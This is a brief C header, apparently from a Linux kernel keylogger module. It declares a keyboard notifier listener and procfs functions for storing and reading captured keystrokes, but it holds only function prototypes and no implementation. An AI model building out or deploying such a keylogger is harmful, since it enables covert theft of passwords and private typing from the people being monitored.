#ifndef KLOGGER_HEADER
#define KLOGGER_HEADER

int keyboard_listener(struct notifier_block *nblock, unsigned long code, void *_param);
int init_procfs_file();
void clear_procfs_file();
int read_procfs_file(char *buffer,char **buffer_location,off_t offset, int buffer_length, int *eof, void *data);
int write_procfs_file(struct file *file, const char *buffer, unsigned long count,void *data);

#endif
